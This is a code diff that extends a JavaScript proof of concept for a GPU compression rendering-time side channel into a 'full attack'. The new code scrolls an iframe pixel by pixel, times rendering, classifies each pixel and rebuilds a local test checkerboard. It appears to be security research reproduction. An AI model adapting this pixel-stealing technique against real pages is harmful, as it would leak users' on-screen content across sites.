@@ -1,4 +1,4 @@
-// GPU Compression Side-Channel PoC - Rendering Time Version (Simplified)
+// GPU Compression Side-Channel PoC - Rendering Time Version (FULL ATTACK)
 // Self-contained local version
 
 // Configuration variables
@@ -9,8 +9,18 @@ let numWorkers, bigintDigits;
 let testMode;
 let running = false;
 
+// Calibration statistics
+let blackStats = null;
+let whiteStats = null;
+
 // Worker array for memory stress
 let workers = [];
+
+// Reconstruction state
+let imageWidth = 48;  // Default checkerboard size
+let imageHeight = 48;
+let reconstructionCanvas = null;
+let reconstructionCtx = null;
 
 // Platform detection
 function detectPlatform() {
@@ -120,7 +130,7 @@ async function measureRenderingTime(iframe, duration, sampleCount) {
 // Calculate statistics
 function calculateStats(times) {
   if (!times || times.length === 0) {
-    return { mean: 0, std: 0, min: 0, max: 0 };
+    return { mean: 0, std: 0, min: 0, max: 0, median: 0 };
   }
   
   // Filter outliers (simple method: remove top/bottom 10%)
@@ -133,8 +143,97 @@ function calculateStats(times) {
   const std = Math.sqrt(variance);
   const min = Math.min(...trimmed);
   const max = Math.max(...trimmed);
+  const median = trimmed[Math.floor(trimmed.length / 2)];
   
-  return { mean, std, min, max };
+  return { mean, std, min, max, median };
+}
+
+// Scroll target iframe to specific pixel position
+function scrollToPixel(iframe, x, y) {
+  try {
+    const iframeDoc = iframe.contentWindow.document;
+    const scrollDiv = iframeDoc.getElementById('scroll');
+    if (scrollDiv) {
+      scrollDiv.scrollLeft = x;
+      scrollDiv.scrollTop = y;
+      console.log(`[Scroll] Positioned to pixel (${x}, ${y})`);
+      return true;
+    } else {
+      console.warn('[Scroll] No scroll div found in iframe');
+      return false;
+    }
+  } catch (e) {
+    console.error('[Scroll] Failed to scroll iframe:', e);
+    return false;
+  }
+}
+
+// Wait for a specific number of animation frames
+function waitFrames(numFrames) {
+  return new Promise((resolve) => {
+    let count = 0;
+    function frame() {
+      count++;
+      if (count >= numFrames) {
+        resolve();
+      } else {
+        requestAnimationFrame(frame);
+      }
+    }
+    requestAnimationFrame(frame);
+  });
+}
+
+// Measure timing for current iframe state
+async function measureCurrentState(iframe, samples = 30) {
+  const times = [];
+  
+  for (let i = 0; i < samples; i++) {
+    const startTime = performance.now();
+    await waitFrames(2); // Wait for rendering
+    const endTime = performance.now();
+    times.push(endTime - startTime);
+  }
+  
+  return calculateStats(times);
+}
+
+// Classify pixel based on timing measurement
+function classifyPixel(stats, blackMean, whiteMean, low, high) {
+  const range = whiteMean - blackMean;
+  const threshold_low = blackMean + range * low;
+  const threshold_high = blackMean + range * high;
+  
+  if (stats.mean < threshold_low) {
+    return { color: 'black', confidence: 'high', hex: '#000000' };
+  } else if (stats.mean > threshold_high) {
+    return { color: 'white', confidence: 'high', hex: '#ffffff' };
+  } else {
+    // Medium confidence - use median as tiebreaker
+    const threshold_mid = blackMean + range * 0.5;
+    if (stats.median < threshold_mid) {
+      return { color: 'black', confidence: 'medium', hex: '#000000' };
+    } else {
+      return { color: 'white', confidence: 'medium', hex: '#ffffff' };
+    }
+  }
+}
+
+// Paint pixel on reconstruction canvas
+function paintReconstructedPixel(x, y, color) {
+  if (!reconstructionCtx) return;
+  
+  reconstructionCtx.fillStyle = color;
+  reconstructionCtx.fillRect(x, y, 1, 1);
+}
+
+// Get expected pixel color for validation (checkerboard pattern)
+function getExpectedPixelColor(x, y) {
+  const squareSize = 12; // 48 / 4 = 12 pixels per square
+  const rowSquare = Math.floor(y / squareSize);
+  const colSquare = Math.floor(x / squareSize);
+  const isBlack = (rowSquare + colSquare) % 2 === 0;
+  return isBlack ? '#000000' : '#ffffff';
 }
 
 // Main calibration function
@@ -166,12 +265,12 @@ async function runCalibration() {
   console.log(`[Calibration] Black: ${blackStats.mean.toFixed(2)}ms, White: ${whiteStats.mean.toFixed(2)}ms, Ratio: ${ratio.toFixed(3)}`);
   
   if (ratio < 1.2) {
-    updateStatus('⚠️ Warning: Small timing difference. Try enabling stress or increasing layers.');
+    updateStatus('Warning: Small timing difference. Attack may not be reliable.');
     console.warn('[Calibration] Timing difference too small for reliable detection');
   } else if (ratio > 2.0) {
-    updateStatus('✓ Excellent timing separation! Ready for attack.');
+    updateStatus('Done: Excellent timing separation! Ready for attack.');
   } else {
-    updateStatus('✓ Good timing separation. Should work.');
+    updateStatus('Done: Good timing separation. Attack should work.');
   }
   
   return { blackStats, whiteStats, ratio };
@@ -198,22 +297,131 @@ async function runTest() {
     
     // Run calibration
     const calibration = await runCalibration();
+    blackStats = calibration.blackStats;
+    whiteStats = calibration.whiteStats;
     
     if (testMode) {
-      updateStatus('✓ Test mode complete. Check results above.');
+      updateStatus('Done: Test mode complete. Check results above.');
     } else {
-      updateStatus('✓ Calibration complete. Full attack not implemented in this simplified version.');
-      console.log('[Info] This is a simplified PoC. Full pixel stealing would continue here.');
+      // FULL ATTACK MODE - Pixel Stealing
+      await runFullAttack(calibration);
     }
     
   } catch (error) {
     console.error('[Error] Test failed:', error);
-    updateStatus('❌ Error: ' + error.message);
+    updateStatus('Error: ' + error.message);
   } finally {
     stopStressWorkers();
     running = false;
     document.getElementById('run-button').disabled = false;
   }
+}
+
+// Full pixel stealing attack
+async function runFullAttack(calibration) {
+  console.log('[ATTACK] Starting full pixel stealing attack');
+  
+  updateStatus('🎯 Starting pixel-by-pixel reconstruction...');
+  
+  // Initialize reconstruction canvas
+  reconstructionCanvas = document.getElementById('reconstruction-canvas');
+  reconstructionCtx = reconstructionCanvas.getContext('2d');
+  reconstructionCtx.fillStyle = '#808080';
+  reconstructionCtx.fillRect(0, 0, imageWidth, imageHeight);
+  
+  // Get target iframe
+  const targetIframe = document.getElementById('iframe-target');
+  
+  // Wait for iframe to be ready
+  await new Promise(resolve => setTimeout(resolve, 1000));
+  
+  // Statistics
+  let totalPixels = imageWidth * imageHeight;
+  let processedPixels = 0;
+  let correctPixels = 0;
+  let startTime = performance.now();
+  
+  console.log(`[ATTACK] Reconstructing ${imageWidth}x${imageHeight} = ${totalPixels} pixels`);
+  
+  // Loop through each pixel
+  for (let y = 0; y < imageHeight; y++) {
+    for (let x = 0; x < imageWidth; x++) {
+      if (!running) {
+        updateStatus('Attack stopped by user');
+        return;
+      }
+      
+      // Scroll to pixel (x, y)
+      scrollToPixel(targetIframe, x, y);
+      
+      // Wait for rendering to stabilize
+      await waitFrames(3);
+      
+      // Measure timing
+      const stats = await measureCurrentState(targetIframe, 20);
+      
+      // Classify pixel
+      const classification = classifyPixel(
+        stats,
+        blackStats.mean,
+        whiteStats.mean,
+        thresholdLow,
+        thresholdHigh
+      );
+      
+      // Paint reconstructed pixel
+      paintReconstructedPixel(x, y, classification.hex);
+      
+      // Validate (for checkerboard pattern)
+      const expected = getExpectedPixelColor(x, y);
+      const isCorrect = classification.hex === expected;
+      if (isCorrect) correctPixels++;
+      
+      processedPixels++;
+      const accuracy = ((correctPixels / processedPixels) * 100).toFixed(1);
+      const progress = ((processedPixels / totalPixels) * 100).toFixed(1);
+      const elapsed = ((performance.now() - startTime) / 1000).toFixed(1);
+      const eta = ((elapsed / processedPixels) * (totalPixels - processedPixels)).toFixed(0);
+      
+      // Log progress every 48 pixels (one row)
+      if (x === imageWidth - 1) {
+        console.log(`[ATTACK] Row ${y + 1}/${imageHeight} complete - ` +
+                   `Accuracy: ${accuracy}% - Progress: ${progress}% - ` +
+                   `Time: ${elapsed}s - ETA: ${eta}s`);
+      }
+      
+      // Update status
+      updateStatus(`🎯 Stealing pixels: ${progress}% (${processedPixels}/${totalPixels}) - ` +
+                  `Accuracy: ${accuracy}% - ETA: ${eta}s`);
+      
+      // Detailed log for debugging (every 10th pixel)
+      if (processedPixels % 10 === 0) {
+        console.log(`[PIXEL] (${x},${y}): ${classification.color} (${classification.confidence}) ` +
+                   `timing=${stats.mean.toFixed(2)}ms ` +
+                   `expected=${expected} ` +
+                   `${isCorrect ? 'Done:' : '✗'}`);
+      }
+    }
+  }
+  
+  // Attack complete
+  const totalTime = ((performance.now() - startTime) / 1000).toFixed(1);
+  const finalAccuracy = ((correctPixels / totalPixels) * 100).toFixed(1);
+  
+  console.log(`[ATTACK] COMPLETE!`);
+  console.log(`[ATTACK] Total time: ${totalTime}s`);
+  console.log(`[ATTACK] Total pixels: ${totalPixels}`);
+  console.log(`[ATTACK] Correct pixels: ${correctPixels}`);
+  console.log(`[ATTACK] Accuracy: ${finalAccuracy}%`);
+  console.log(`[ATTACK] Average time per pixel: ${(totalTime / totalPixels).toFixed(2)}s`);
+  
+  updateStatus(`Attack complete! Accuracy: ${finalAccuracy}% (${correctPixels}/${totalPixels}) in ${totalTime}s`);
+  
+  // Show results
+  document.getElementById('attack-results').style.display = 'block';
+  document.getElementById('attack-accuracy').textContent = finalAccuracy + '%';
+  document.getElementById('attack-time').textContent = totalTime + 's';
+  document.getElementById('attack-pixels').textContent = `${correctPixels}/${totalPixels}`;
 }
 
 // Stop function
@@ -243,11 +451,11 @@ document.addEventListener('DOMContentLoaded', () => {
   
   if (platform === 'nvidia-dgpu') {
     document.getElementById('info-panel').style.background = '#fff3cd';
-    document.getElementById('info-panel').innerHTML += '<br><strong>⚠️ Note:</strong> NVIDIA dGPU detected. This PoC may show minimal timing differences due to dedicated memory. Consider using chrome-cache or direct GPU timing tests instead.';
+    document.getElementById('info-panel').innerHTML += '<br><strong> Note:</strong> NVIDIA dGPU detected. This PoC may show minimal timing differences due to dedicated memory. Consider using chrome-cache or direct GPU timing tests instead.';
   } else if (platform === 'amd-igpu') {
-    document.getElementById('info-panel').innerHTML += '<br><strong>✓ AMD Radeon iGPU:</strong> Should work well. May need to adjust layer count and enable memory stress.';
+    document.getElementById('info-panel').innerHTML += '<br><strong> AMD Radeon iGPU:</strong> Should work well. May need to adjust layer count and enable memory stress.';
   } else if (platform === 'intel-igpu') {
-    document.getElementById('info-panel').innerHTML += '<br><strong>✓ Intel iGPU:</strong> Optimal platform for this PoC.';
+    document.getElementById('info-panel').innerHTML += '<br><strong> Intel iGPU:</strong> Optimal platform for this PoC.';
   }
   
   // Attach event handlers
